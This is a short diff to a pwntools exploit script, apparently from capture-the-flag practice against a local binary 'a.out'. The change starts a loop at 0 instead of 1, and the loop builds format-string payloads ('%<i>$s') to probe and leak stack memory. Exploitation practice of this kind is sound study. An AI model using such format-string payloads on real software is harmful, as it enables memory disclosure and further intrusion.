@@ -4,7 +4,7 @@ pwn.context.log_level = "critical"
 
 programa = pwn.ELF("./a.out")
 
-for i in range(1, 256):
+for i in range(0, 256):
 
     payload = b"".join([
         b"%" + str(i).encode("utf-8") + b"$s"
